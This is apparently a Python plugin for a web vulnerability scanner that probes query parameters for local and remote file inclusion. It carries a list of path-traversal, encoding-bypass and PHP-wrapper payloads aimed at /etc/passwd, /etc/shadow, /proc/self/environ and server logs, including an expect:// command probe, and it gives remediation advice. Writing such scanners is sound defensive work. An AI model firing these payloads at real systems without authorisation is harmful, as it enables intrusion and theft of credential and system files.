"""
Enhanced File Inclusion Scanner — deep LFI/RFI detection.

Tests for Local File Inclusion (LFI) and Remote File Inclusion (RFI)
with advanced bypass techniques:
  - Path traversal with encoding bypasses (double-URL, Unicode, null byte)
  - PHP wrapper abuse (php://filter, php://input, data://)
  - Log file poisoning vectors
  - Windows and Linux path variants
  - Parameter discovery (not just common params)

OWASP A01 — Broken Access Control
OWASP A03 — Injection
"""
import asyncio
import re
import urllib.parse

import httpx

from app.scanner.plugins.base import Plugin, PluginMeta, PluginResult, Finding
from app.scanner.context import stable_fingerprint

META = PluginMeta(
    plugin_id="vuln.file.inclusion",
    name="File Inclusion Scanner (LFI/RFI)",
    category="vuln_scan",
    depends_on=["fingerprint.http"],
    consumes=["fingerprint.http", "recon.directories"],
    provides=["vuln.lfi_rfi"],
    enabled_by_default=True,
    timeout_seconds=180.0,
)

# ── LFI Payloads ─────────────────────────────────────────────────────────────

LFI_PAYLOADS = [
    # Basic traversal
    ("../../../etc/passwd", "basic traversal"),
    ("../../../etc/shadow", "shadow file"),
    ("../../../../etc/passwd", "deep traversal"),
    ("....//....//....//etc/passwd", "double-dot bypass"),
    ("..%2f..%2f..%2fetc%2fpasswd", "URL-encoded slash"),
    ("%2e%2e/%2e%2e/%2e%2e/etc/passwd", "URL-encoded dots"),
    ("..%252f..%252f..%252fetc/passwd", "double URL-encoded"),
    ("..%c0%af..%c0%af..%c0%afetc/passwd", "Unicode bypass (overlong)"),
    ("..\\..\\..\\/etc/passwd", "mixed separators"),

    # Windows paths
    ("..\\..\\..\\windows\\system32\\drivers\\etc\\hosts", "Windows hosts file"),
    ("..\\..\\..\\windows\\win.ini", "Windows win.ini"),
    ("C:\\windows\\system32\\drivers\\etc\\hosts", "Windows absolute path"),

    # PHP wrappers (detect without exploiting)
    ("php://filter/convert.base64-encode/resource=/etc/passwd", "PHP filter wrapper"),
    ("php://filter/read=string.rot13/resource=/etc/passwd", "PHP filter rot13"),
    ("expect://id", "PHP expect wrapper"),

    # Null byte injection (older PHP)
    ("../../../etc/passwd%00", "null byte terminator"),
    ("../../../etc/passwd%00.png", "null byte with extension"),

    # Path truncation
    ("../../../etc/passwd" + "/./" * 50, "path truncation"),

    # Log file inclusion vectors (read-only check)
    ("/var/log/apache2/access.log", "Apache access log"),
    ("/var/log/nginx/access.log", "Nginx access log"),
    ("/var/log/auth.log", "Auth log"),
    ("/proc/self/environ", "Process environment"),
    ("/proc/self/cmdline", "Process command line"),
]

# Success indicators for LFI
LFI_SUCCESS_PATTERNS = [
    r"root:.*:0:0:",                    # /etc/passwd
    r"daemon:.*:/usr/sbin",             # /etc/passwd
    r"\[fonts\]",                       # Windows win.ini
    r"\[extensions\]",                  # Windows system.ini
    r"# localhost",                     # /etc/hosts or Windows hosts
    r"127\.0\.0\.1\s+localhost",        # hosts file
    r"DOCUMENT_ROOT=",                  # /proc/self/environ
    r"HTTP_HOST=",                      # /proc/self/environ
    r"cm9vdDp",                         # base64 of "root:" (php://filter)
    r"ebb[gy]:k:",                      # rot13 of "root:x:" (php://filter)
]

# ── RFI Payloads ──────────────────────────────────────────────────────────────

RFI_INDICATORS = [
    # We don't actually fetch remote files — we check if the app
    # tries to include URLs by looking for telltale errors
    "allow_url_include",
    "failed to open stream: no suitable wrapper",
    "URL file-access is disabled",
    "include(): Failed opening",
    "require_once(): Failed opening",
]

# ── Parameters to test ────────────────────────────────────────────────────────

# Common parameter names that are often vulnerable to file inclusion
FILE_PARAMS = [
    "file", "path", "page", "doc", "document", "template",
    "include", "inc", "dir", "folder", "module", "load",
    "read", "content", "view", "display", "show", "cat",
    "action", "type", "layout", "theme", "lang", "language",
    "url", "src", "source", "download", "img", "image",
    "filename", "filepath", "name",
]


async def _test_lfi(
    client: httpx.AsyncClient,
    base_url: str,
    param: str,
    payload: str,
    desc: str,
) -> dict | None:
    """Test a single LFI payload. Returns dict if vulnerable."""
    url = f"{base_url}?{param}={urllib.parse.quote(payload)}"
    try:
        r = await client.get(url)
        if r.status_code != 200:
            return None
        body = r.text
        for pattern in LFI_SUCCESS_PATTERNS:
            if re.search(pattern, body):
                return {
                    "param": param,
                    "payload": payload,
                    "desc": desc,
                    "pattern": pattern,
                    "status": r.status_code,
                }
        # Check for RFI indicators in error messages
        for indicator in RFI_INDICATORS:
            if indicator.lower() in body.lower():
                return {
                    "param": param,
                    "payload": payload,
                    "desc": f"RFI indicator: {indicator}",
                    "pattern": indicator,
                    "status": r.status_code,
                    "rfi": True,
                }
    except Exception:
        pass
    return None


async def _discover_params(client: httpx.AsyncClient, base_url: str) -> set:
    """Discover parameters from the page's HTML forms and links."""
    params = set()
    try:
        r = await client.get(base_url)
        if r.status_code != 200:
            return params
        body = r.text
        # Extract from form inputs
        for m in re.finditer(r'name=["\']([a-zA-Z_][\w]*)["\']', body):
            params.add(m.group(1))
        # Extract from URL query strings in links
        for m in re.finditer(r'[?&]([a-zA-Z_][\w]*)=', body):
            params.add(m.group(1))
    except Exception:
        pass
    return params


class Check(Plugin):
    async def run(self, target: str, ctx) -> PluginResult:
        fp = ctx.get("fingerprint.http", {}) or {}
        http_items = fp.get("http", [])
        target_raw = ctx.get("target_raw", target)
        findings = []

        has_explicit_url = bool(re.match(r"^https?://", target_raw, re.I))
        if has_explicit_url:
            base_url = target_raw.rstrip("/")
        elif http_items:
            base_url = http_items[0].get("url", f"http://{target}").rstrip("/")
        else:
            base_url = f"http://{target}"

        if not has_explicit_url and not http_items:
            return PluginResult(
                findings=[
                    Finding(
                        severity="info",
                        plugin_id=META.plugin_id,
                        title="File inclusion scan skipped - no web service detected",
                        description=(
                            "No HTTP fingerprint was discovered for this target. "
                            "Skipping LFI/RFI checks to avoid timeout findings on non-web hosts."
                        ),
                        evidence=f"target={target} http_fingerprint=none",
                        affected=target,
                        fingerprint=stable_fingerprint(target, META.plugin_id, "skipped_no_http"),
                    )
                ],
                artifacts={"vuln.lfi_rfi": 0},
            )

        request_timeout = min(max(float(ctx.policy.timeout_seconds), 8.0), 25.0)

        async with httpx.AsyncClient(
            timeout=request_timeout,
            verify=False,
            follow_redirects=True,
            limits=httpx.Limits(max_connections=8, max_keepalive_connections=4),
        ) as client:

            # Discover additional parameters from the page
            discovered_params = await _discover_params(client, base_url)
            # Merge with common file-related params
            all_params = list(set(FILE_PARAMS) | {p for p in discovered_params if len(p) < 20})

            # Also check paths discovered by directory crawl
            extra_urls = [base_url]
            crawled = ctx.get("recon.directories", []) or []
            for p in crawled[:10]:
                if p.endswith((".php", ".asp", ".aspx", ".jsp")):
                    extra_urls.append(f"{base_url}/{p}")

            # Test LFI payloads
            sem = asyncio.Semaphore(6)
            found_vulns = {}  # param -> first hit

            for test_url in extra_urls[:5]:
                for param in all_params[:8]:  # Limit params per URL
                    if param in found_vulns:
                        continue
                    for payload, desc in LFI_PAYLOADS[:6]:  # Top payloads
                        async with sem:
                            result = await _test_lfi(client, test_url, param, payload, desc)
                        if result:
                            found_vulns[param] = result
                            break  # One hit per param is enough

            # Generate findings
            for param, hit in found_vulns.items():
                is_rfi = hit.get("rfi", False)

                if is_rfi:
                    findings.append(Finding(
                        severity="high",
                        plugin_id=META.plugin_id,
                        title=f"Remote File Inclusion indicator (parameter: {param})",
                        description=(
                            f"The parameter '{param}' shows RFI indicators. The server may "
                            f"attempt to include remote URLs, enabling remote code execution."
                        ),
                        evidence=f"url={base_url}?{param}=... indicator={hit['desc']}",
                        affected=target,
                        fingerprint=stable_fingerprint(target, META.plugin_id, "rfi", param),
                        remediation=(
                            "[HIGH — Remote File Inclusion]\n"
                            "1. Set allow_url_include = Off in php.ini\n"
                            "2. Set allow_url_fopen = Off if not needed\n"
                            "3. Never use user input in include/require statements\n"
                            "4. Use a whitelist of allowed files to include"
                        ),
                        cvss=8.6,
                        confidence=0.75,
                        references=[
                            "https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/11.2-Testing_for_Remote_File_Inclusion",
                        ],
                    ))
                else:
                    findings.append(Finding(
                        severity="critical",
                        plugin_id=META.plugin_id,
                        title=f"Local File Inclusion detected (parameter: {param})",
                        description=(
                            f"The parameter '{param}' is vulnerable to Local File Inclusion. "
                            f"Server filesystem content was read using: {hit['desc']}. "
                            f"An attacker can read sensitive files like /etc/passwd, "
                            f"application source code, configuration files, and potentially "
                            f"achieve remote code execution via log poisoning."
                        ),
                        evidence=(
                            f"url={base_url}?{param}={hit['payload']} "
                            f"technique={hit['desc']} pattern_matched={hit['pattern']}"
                        ),
                        affected=target,
                        fingerprint=stable_fingerprint(target, META.plugin_id, "lfi", param),
                        remediation=(
                            "[CRITICAL — Local File Inclusion / Path Traversal]\n"
                            "1. Never use user input directly in file paths or include/require\n"
                            "2. Use a whitelist of allowed files:\n"
                            "   $allowed = ['home', 'about', 'contact'];\n"
                            "   if (in_array($page, $allowed)) include($page . '.php');\n"
                            "3. Use realpath() and verify the path starts with allowed directory\n"
                            "4. Disable allow_url_include in php.ini\n"
                            "5. Use open_basedir to restrict filesystem access\n"
                            "6. Deploy a WAF with LFI/traversal rules"
                        ),
                        cvss=9.1,
                        confidence=0.9,
                        references=[
                            "https://owasp.org/Top10/A01_2021-Broken_Access_Control/",
                            "https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/11.1-Testing_for_Local_File_Inclusion",
                        ],
                    ))

            # Summary
            findings.append(Finding(
                severity="info",
                plugin_id=META.plugin_id,
                title=f"File inclusion scan: {len(all_params)} params tested, {len(found_vulns)} vulnerable",
                evidence=f"params_tested={len(all_params)} payloads_per_param={min(6,len(LFI_PAYLOADS))} urls_tested={len(extra_urls)} vulns={len(found_vulns)}",
                affected=target,
                fingerprint=stable_fingerprint(target, META.plugin_id, "summary"),
            ))

        return PluginResult(
            findings=findings,
            artifacts={"vuln.lfi_rfi": list(found_vulns.keys())},
        )
